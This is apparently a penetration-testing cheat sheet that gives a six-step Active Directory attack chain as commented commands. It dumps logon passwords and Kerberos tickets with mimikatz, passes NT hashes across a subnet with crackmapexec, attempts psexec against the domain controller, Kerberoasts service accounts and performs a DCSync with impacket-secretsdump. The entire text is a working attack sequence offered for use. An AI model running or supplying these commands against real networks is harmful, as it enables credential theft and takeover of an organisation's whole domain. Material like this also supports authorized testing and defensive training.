# Step 1 - Dump credentials from workstation
# On Windows target:
mimikatz "privilege::debug" "sekurlsa::logonpasswords"
mimikatz "sekurlsa::tickets /export"

# Step 2 - Pass the hash to other hosts
crackmapexec smb $NETWORK/24 -u user -H NT_HASH --shares

# Step 3 - Find Domain Controller
nslookup domain.local

# Step 4 - Attempt PtH to DC
impacket-psexec -hashes LM:NT user@$DC

# Step 5 - If PtH fails, try Kerberoast from workstation
impacket-GetUserSPNs domain.local/user:pass -request

# Step 6 - DC Sync from compromised host
impacket-secretsdump -just-dc domain.local/user:pass@$DC